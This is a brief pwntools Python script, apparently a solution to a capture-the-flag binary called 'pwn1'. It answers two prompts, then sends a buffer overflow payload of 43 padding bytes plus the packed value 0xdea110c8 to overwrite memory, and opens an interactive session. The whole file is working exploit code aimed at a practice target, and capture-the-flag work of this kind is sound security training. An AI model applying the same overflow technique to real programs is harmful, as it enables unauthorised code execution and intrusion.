from pwn import *

r = process("./pwn1")

r.sendline("Sir Lancelot of Camelot.")
r.sendline("To seek the Holy Grail.")

r.sendline("A" * 43 + p32(0xdea110c8))
r.interactive()